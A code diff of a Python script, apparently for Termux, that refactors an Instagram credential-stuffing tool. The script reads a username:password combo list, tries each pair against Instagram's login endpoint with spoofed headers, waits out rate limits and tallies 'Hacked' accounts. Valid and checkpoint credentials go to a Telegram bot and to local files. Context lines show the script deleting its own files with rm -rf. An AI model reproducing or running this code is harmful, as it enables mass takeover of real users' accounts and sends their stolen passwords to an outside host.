@@ -6,18 +6,6 @@ os.system("rm -rf .insta.py")
 os.system("rm -rf insta.py")
 os.system("rm -rf /data/data/com.termux/files/svr")
 os.system("clear")
-bad=0
-timeout=0
-hits=0
-checkpoint=0
-error=0
-hitss = 0
-badd = 0
-freee = 0
-errorr = 0
-hitsss=0
-baddd=0
-bad_broxyy=0
 wd = "\033[90;1m" 
 GL = "\033[96;1m"
 BB = "\033[34;1m"
@@ -33,23 +21,28 @@ W = "\033[0;1m"
 R = "\033[31m"   
 C = "\033[36;1m"
 def instagram():
-    import json, requests, user_agent,os ,sys, time, datetime
-    import requests
-    from user_agent import generate_user_agent
-    from datetime import datetime
-    r = requests.session()
-    print(" la aesta da ba be Proxya ")
-    ID=input("   Your ID Telegram :")
-    token=input("  Token(bot) : ")
-    def loopPp():
-        global bad, timeout, hacked, checkpoint, error, hits
-        combo=input(" [ Path ] File >> ")
-        file = open(combo,'r').read().splitlines()
-        for line in file:
-            user = line.split(':')[0]
-            pasw = line.split(':')[1]
-            url = 'https://www.instagram.com/accounts/login/ajax/'
-            head = {
+	import json, requests, user_agent,os ,sys, time, datetime
+	import requests
+	from user_agent import generate_user_agent
+	from datetime import datetime
+	bad=0
+	timeout=0
+	hits=0
+	checkpoint=0
+	error=0
+	r = requests.session()
+	print(" la aesta da ba be Proxya ")
+	ID=input("   Your ID Telegram :")
+	token=input("  Token(bot) : ")
+	def loopPp():
+		global bad, timeout, hacked, checkpoint, error, hits
+		combo=input(" [ Path ] File >> ")
+		file = open(combo,'r').read().splitlines()
+		for line in file:
+			user = line.split(':')[0]
+			pasw = line.split(':')[1]
+			url = 'https://www.instagram.com/accounts/login/ajax/'
+			head = {
                 'accept':'*/*',
                 'accept-encoding':'gzip,deflate,br',
                 'accept-language':'en-US,en;q=0.9,ar;q=0.8',
@@ -66,46 +59,44 @@ def instagram():
                 'x-ig-app-id':'936619743392459',
                 'x-ig-www-claim':'0',
                 'x-instagram-ajax':'8a8118fa7d40',
-                'x-requested-with':'XMLHttpRequest'
-            }
-            time_now = int(datetime.now().timestamp())
-            data = {
+                'x-requested-with':'XMLHttpRequest'}
+			time_now = int(datetime.now().timestamp())
+			data = {
                 'username': user,
                 'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                 'queryParams': {},
-                'optIntoOneTap': 'false',
-            }
-            login = r.post(url,headers=head,data=data).text
-            try:
-                if '"authenticated":false' in login:
-                    bad+=1
-                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
-                elif '"message":"Please wait a few minutes before you try again."' in login:
-                    timeout+=1
-                    import time
-                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
-                    time.sleep(309)
-                elif 'userId' in login:
-                    hits+=1
-                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end='')
-                    boooom=f"GOOD: "+user+":"+pasw
-                    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
-                    with open('Good(instgram).txt', 'a') as ff:
-                        ff.write(f"\nuser&num&emil: "+user+":"+pasw)
-                elif ('"message":"checkpoint_required"') in login:
-                    checkpoint+=1
-                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
-                    booom=f"Checkpoint: "+user+":"+pasw
-                    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
-                    with open("checkpoint.txt", "a") as dd:
-                        dd.write(f"\nuser&num&emil: "+user+":"+pasw)
-                else:
-                    error+=1
-                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
-            except:
-                print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error} ",end="")
-    loopPp()
-    print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
+                'optIntoOneTap': 'false',}
+			login = r.post(url,headers=head,data=data).text
+			try:
+				if '"authenticated":false' in login:
+					bad+=1
+					print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+				elif '"message":"Please wait a few minutes before you try again."' in login:
+					timeout+=1
+					import time
+					print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+					time.sleep(309)
+				elif 'userId' in login:
+					hits+=1
+					print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+					boooom=f"GOOD: "+user+":"+pasw
+					r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
+					with open('Good(instgram).txt', 'a') as ff:
+						ff.write(f"\nuser&num&emil: "+user+":"+pasw)
+				elif ('"message":"checkpoint_required"') in login:
+					checkpoint+=1
+					print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+					booom=f"Checkpoint: "+user+":"+pasw
+					r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
+					with open("checkpoint.txt", "a") as dd:
+						dd.write(f"\nuser&num&emil: "+user+":"+pasw)
+				else:
+					error+=1
+					print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+			except:
+				print(f'\r[-] GOOD : {hits} \n [-] Checkpoint : {checkpoint} \n [-]Bad : {bad} \n [-] Timeout : {timeout} \n [-] Error : {error}',end='')
+	loopPp()
+	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 def dwbara():
     import json, requests, user_agent,os ,sys, time, datetime
     os.system("clear")
